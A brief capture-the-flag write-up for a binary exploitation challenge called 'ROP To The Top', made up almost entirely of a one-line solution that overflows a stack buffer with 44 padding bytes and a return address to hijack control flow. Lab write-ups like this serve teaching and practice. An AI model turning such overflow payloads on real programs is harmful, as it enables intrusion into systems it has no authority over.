# ROP To The Top

**Category:** Binary Exploitation
**Points:** 130
**Description:**

> Rop, rop, rop
> Rop to the top!
> Slip and slide and ride that rhythm...
> 
> Here's some binary and source. Navigate to /problems/roptothetop/ on the shell server to try your exploit out!

## Write-up

```python
./rop $(python -c "print 'A'*44+'\xdb\x84\x04\x08'")
```


